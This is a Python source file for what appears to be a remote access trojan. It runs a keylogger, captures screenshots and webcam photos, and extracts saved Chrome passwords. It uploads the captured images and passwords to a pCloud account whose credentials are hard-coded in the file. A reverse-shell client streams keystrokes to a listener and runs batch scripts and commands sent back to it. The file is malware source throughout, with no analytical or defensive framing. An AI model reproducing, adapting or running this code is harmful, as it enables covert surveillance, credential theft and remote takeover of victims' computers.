import threading,time,subprocess,socket,pcloud,os
import kloglib,passretlib,scrshotlib,webcamlib,reverselib





class keylogger:
    def start():
        global keyloggerthread
        keyloggerthread = threading.Thread(target=kloglib.startklog)
        keyloggerthread.setDaemon(True)
        keyloggerthread.start()

class images:
    def screenshot():
        name = ''
        name = scrshotlib.tss(name)
        obj = pcloud.PyCloud("uwy40726@bcaoo.com","ratsaregood")

        image_file = open(name, "rb")
        sc_image = image_file.read()
        image_file.close()

        obj.uploadfile(filename="/sswb/"+name, data=sc_image)

        os.remove(name)
    def webshot():
        name=""
        name = webcamlib.takepic()
        obj = pcloud.PyCloud("uwy40726@bcaoo.com","ratsaregood")

        image_file = open(name, "rb")
        sc_image = image_file.read()
        image_file.close()

        obj.uploadfile(filename="/sswb/"+name, data=sc_image)
        os.remove(name)

class passwords:        
    def chrome_get():
        pass_list = passretlib.retreive.chrome()
        t=time.gmtime()
        name = "UNPW "+str(t.tm_hour)+"."+str(t.tm_min)+"."+str(t.tm_sec)+" "+str(t.tm_mday)+"-"+str(t.tm_mon)+"-"+str(t.tm_year)
        name = name+".txt"
        obj = pcloud.PyCloud("uwy40726@bcaoo.com","ratsaregood")
        obj.uploadfile(filename="/unpw/"+name, data=("\n\n".join(pass_list)))


class clients:
    class keylog:
        def start_client():
            global obj
            obj = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            obj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server = "127.0.0.1"
            port = 230
            ip = (server,port)
            while True:
                try:
                    obj.connect(ip)
                    while True:
                        try:
                            checkedlen = int(kloglib.helpers.lenofbufferkeys())
                            if checkedlen > int(kloglib.helpers.pereverynum()):
                                tosend = kloglib.helpers.sendbk()
                                stringtheory = "|JOIN|".join(tosend)
                                obj.sendall(stringtheory.encode())
                            time.sleep(5)
                        except:
                            None
                except:
                    None
    class revshell:
        def start_client():
            global revobj
            revobj = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            revobj.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            server = "127.0.0.1"
            port =231
            ip =(server,port)
            while True:
                try:
                    revobj.connect(ip)
                except:
                    None
                while True:
                    try:
                        num = 4096*4
                        data = revobj.recv(num)
                        data = data.decode()
                        if data.lower() == "screenshot":
                            images.screenshot()
                            tosend = "Done!"
                        elif data.lower() == "webshot":
                            images.webshot()
                            tosend = "Done!"
                        elif data.lower() == "getchromepasswords":
                            passwords.chrome_get()
                            tosend = "Done!"
                        elif "#bashscriptstart" in data:
                            data = data.replace("#bashscriptstart","")
                            bat_file = open("ex.bat","w")
                            bat_file.write(data)
                            bat_file.close()
                            fh = os.popen("ex.bat")
                            tosend = fh.read()

                        else:
                            tosend = reverselib.rscommands(data)
                        revobj.sendall(tosend.encode())
                    except:
                        None
                    
                        


keylogger.start()
time.sleep(2)
klct = threading.Thread(target=clients.keylog.start_client)
klct.setDaemon(True)
klct.start()
rsct = threading.Thread(target=clients.revshell.start_client)
rsct.setDaemon(True)
rsct.start()

while True:
    None
